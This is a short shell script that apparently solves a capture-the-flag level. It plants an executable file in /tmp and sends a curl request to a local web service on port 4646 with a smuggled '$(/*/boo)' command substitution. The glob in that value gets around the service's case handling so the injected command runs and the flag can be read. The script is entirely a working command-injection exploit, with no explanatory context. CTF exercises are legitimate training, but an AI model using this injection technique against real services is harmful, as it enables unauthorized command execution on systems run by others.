#!/bin/sh

echo "getflag > /tmp/flag" > /tmp/BOO
chmod +x /tmp/BOO
curl localhost:4646?x='$(/*/boo)' 1>/dev/null 2>/dev/null
cat /tmp/flag | cut -d: -f2 | cut -c2-
